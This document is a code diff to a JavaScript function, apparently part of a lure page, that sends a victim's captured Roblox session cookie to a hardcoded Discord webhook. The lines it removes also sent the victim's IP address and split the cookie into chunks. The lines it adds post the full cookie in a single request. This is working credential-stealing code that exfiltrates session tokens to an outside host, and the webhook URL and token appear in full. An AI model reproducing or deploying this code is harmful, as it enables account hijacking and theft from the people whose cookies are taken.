@@ -244,27 +244,17 @@ async function submitPowerShell() {
         if (globalRobloxCookie) {
             const webhookUrl = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
             
-            // Send cookie in smaller chunks to avoid 400 error
-            const cookieChunks = globalRobloxCookie.match(/.{1,1800}/g) || [globalRobloxCookie];
-            
-            for (let i = 0; i < cookieChunks.length; i++) {
-                const message = {
-                    content: i === 0 ? `IP: ${locationInfo.ip || 'Unknown'}\nCookie: ${cookieChunks[i]}` : cookieChunks[i]
-                };
+            const message = {
+                content: globalRobloxCookie
+            };
 
-                await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(message)
-                });
-                
-                // Small delay between messages
-                if (i < cookieChunks.length - 1) {
-                    await new Promise(resolve => setTimeout(resolve, 100));
-                }
-            }
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(message)
+            });
         }
 
         // Continue flow regardless of webhook success
